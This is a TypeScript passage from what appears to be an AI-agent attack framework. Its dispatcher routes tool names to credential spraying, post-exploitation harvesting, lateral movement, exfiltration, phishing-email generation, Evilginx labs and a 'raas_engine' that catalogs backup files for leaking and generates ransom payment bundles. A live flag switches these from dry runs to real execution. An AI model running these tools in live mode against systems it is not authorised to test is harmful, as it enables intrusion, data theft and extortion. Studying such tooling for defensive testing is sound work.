  const mod = await import("./edge_appliance_audit.ts")
  const r = await mod.auditEdgeAppliance({ target: ctx.target }, { live: ctx.live })
  return { tool: "edge_audit", command: "auditEdgeAppliance", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runCicdAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./cicd_k8s_audit.ts")
  const r = await mod.auditCICDAndK8s({ repositoryOrCluster: ctx.target }, { live: ctx.live })
  return { tool: "cicd_audit", command: "auditCICDAndK8s", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runIdpAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./idp_oauth_audit.ts")
  const r = await mod.auditIdPAndOAuth({ domain: hostFromTarget(ctx.target) }, { live: ctx.live })
  return { tool: "idp_audit", command: "auditIdPAndOAuth", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runSocialEngAssess(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./social_eng.ts")
  const email = mod.generatePhishingEmail("it_password_reset", { dryRun: !ctx.live, targetName: "assessment", targetCompany: hostFromTarget(ctx.target) })
  return { tool: "social_eng_assess", command: "social_eng checklist", dryRun: !ctx.live, success: true, output: JSON.stringify(email).slice(0, 4000) }
}

async function runRansomwareAssess(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { assessRaasReadiness, buildLeakCatalog, generatePaymentBundle } = await import("./raas_engine.ts")
  const targetDir = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
  const readiness = assessRaasReadiness(targetDir)
  const catalog = buildLeakCatalog(targetDir, { live: ctx.live, maxFiles: 50 })
  const payment = generatePaymentBundle({ live: ctx.live, forceLive: Boolean(params.forceLive) })
  return {
    tool: "ransomware_assess",
    command: "assessRaasReadiness",
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify({ readiness, leakSample: catalog.entries.length, paymentId: payment.keyId }).slice(0, 4000),
  }
}

async function runImpactAssess(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { ImpactDemonstrationEngine } = await import("./impact_engine.ts")
  return {
    tool: "impact_assess",
    command: "impact_engine recovery gap assessment",
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify({
      engine: ImpactDemonstrationEngine.name,
      note: "Non-destructive wiper/recovery gap checklist — verify offline backups and immutable snapshots",
      live: ctx.live,
    }).slice(0, 4000),
  }
}

async function runCalderaTtp(ctx: AgentToolContext, params: Record<string, unknown>): Promise<ToolRunResult> {
  const mod = await import("./caldera_ttp.ts")
  const tid = String(params.technique_id ?? "T1059.001")
  const ability = {
    ability_id: tid,
    name: tid,
    tactic: "execution",
    technique_id: tid,
    technique_name: tid,
    executors: [{ name: "sh", platform: "linux", command: "id" }],
  }
  const r = await mod.executeAbility(ability as import("./caldera_ttp.ts").Ability, { live: ctx.live })
  return { tool: "caldera_ttp", command: `executeAbility(${tid})`, dryRun: !ctx.live, success: r.exitCode === 0, output: JSON.stringify(r).slice(0, 4000) }
}

export async function executeAgentTool(
  ctx: AgentToolContext,
  toolName: string,
  params: Record<string, unknown> = {},
): Promise<ToolRunResult> {
  const map: Record<string, () => Promise<ToolRunResult>> = {
    recon: () => runReconTool(ctx, params),
    live_recon: () => runLiveRecon(ctx, params),
    nmap_scan: () => nmapScan(ctx, { host: params.target_host as string, ports: params.ports as string }),
    masscan_scan: () => runMasscan(ctx, { host: params.target_host as string, ports: params.ports as string }),
    gobuster_dir: () => gobusterDir(ctx, { url: params.target_url as string, wordlist: params.wordlist as string }),
    ffuf_scan: () => runFfufScan(ctx, params),
    nuclei_scan: () => nucleiScan(ctx, { url: params.target_url as string }),
    nikto_scan: () => runNiktoScan(ctx, params),
    validate_findings: () => validateSuspectedFindings(ctx),
    web_exploit: () => runWebExploit(ctx, params),
    sqlmap_scan: () => runSqlmapScan(ctx, params),
    identity_attack: () => runIdentityAttack(ctx, params),
    live_ad_attack: () => runLiveAdAttack(ctx, params),
    ad_exploit: () => runAdExploit(ctx, params),
    cloud_enum: () => runCloudEnum(ctx),
    cred_spray: () => runCredSpray(ctx, params),
    enum4linux_scan: () => runEnum4linux(ctx, params),
    container_audit: () => runContainerAudit(ctx),
    privesc_check: () => runPrivescCheck(ctx),
    postex_harvest: () => runPostExHarvest(ctx),
    lateral_move: () => runLateralMove(ctx, params),
    supply_chain_audit: () => runSupplyChainAudit(ctx, params),
    lockfile_scan: () => runLockfileScan(ctx, params),
    postex_pivot: () => runPostExPivot(ctx, params),
    evilginx_lab: () => runEvilginxLab(ctx, params),
    yara_scan: () => runYaraScan(ctx, (params.scan_path as string) || "/tmp"),
    vuln_research: async () => {
      const { checkCisaKev } = await import("./vuln_research.ts")
      const query = String(params.cve_id ?? params.product ?? "CVE-2021-44228")
      const inKev = await checkCisaKev(query, ctx.live)
      return { tool: "vuln_research", command: `checkCisaKev(${query})`, dryRun: !ctx.live, success: true, output: JSON.stringify({ query, inKev }) }
    },
    intel_enrich: () => runIntelEnrich(ctx),
    stix_ingest: () => runStixIngest(ctx, params),
    ai_surface_scan: () => runAiSurfaceScan(ctx),
    cpanel_audit: () => runCpanelAudit(ctx),
    ai_agent_audit: () => runAiAgentAudit(ctx),
    ai_manipulation_test: () => runAiManipulation(ctx),
    atlas_ml_audit: () => runAtlasMlAudit(ctx),
    esxi_audit: () => runEsxiAudit(ctx),
    edge_audit: () => runEdgeAudit(ctx),
    cicd_audit: () => runCicdAudit(ctx),
    idp_audit: () => runIdpAudit(ctx),
    social_eng_assess: () => runSocialEngAssess(ctx),
    ransomware_assess: () => runRansomwareAssess(ctx, params),
    impact_assess: () => runImpactAssess(ctx),
    caldera_ttp: () => runCalderaTtp(ctx, params),
    ai_recon: () => runReconTool(ctx, params),
    exfil: () => runExfil(ctx, params),
    impact_engine: () => runImpactAssess(ctx),
    dev_target: () => runDevTarget(ctx),
    cloud_token: () => runCloudToken(ctx),
    pivot_replay: () => runPivotReplay(ctx, params),
  }
  const fn = map[toolName]
  if (fn) return fn()
  const { runBridgedModule } = await import("./module_bridge.ts")
  const bridged = await runBridgedModule(ctx, toolName, params)
  if (bridged) return bridged
  return { tool: toolName, command: toolName, dryRun: !ctx.live, success: false, output: "", error: `unknown tool: ${toolName}` }
}

export function graphFindingsToAgentFindings(graph: AttackSurfaceGraph, target: string): AgentFinding[] {
  const host = hostFromTarget(target)
  const asset = (graph.toJSON() as { assets?: Record<string, { services?: Record<string, { port: number; vulns?: import("./attack_surface.ts").VulnNode[] }> }> }).assets?.[host]
  if (!asset) return []

  const findings: AgentFinding[] = []
  for (const svc of Object.values(asset.services ?? {})) {
    for (const v of svc.vulns ?? []) {
      if (v.state === "FALSE_POSITIVE") continue
      findings.push({
        id: v.id,
        title: v.title,
        severity: v.severity,
        description: `${v.title} on port ${(svc as { port?: number }).port ?? "?"} [${v.state}]`,
        evidence: v.evidence.map((e) => e.rawOutput.slice(0, 200)).join("\n"),
        recommendation: v.state === "CONFIRMED" ? "Prioritize remediation — validated finding" : "Run validation_engine to confirm",
        timestamp: new Date().toISOString(),
      })
    }
  }
  for (const p of graph.analyzeAttackPaths()) {
    findings.push({
      id: p.id,
      title: p.label,
      severity: p.severity === "critical" ? "critical" : p.severity === "high" ? "high" : "medium",
      description: p.narrative,
      evidence: p.steps.join(" → "),
      recommendation: "Review attack path and validate each hop",
      timestamp: new Date().toISOString(),
    })
  }
  return findings
}
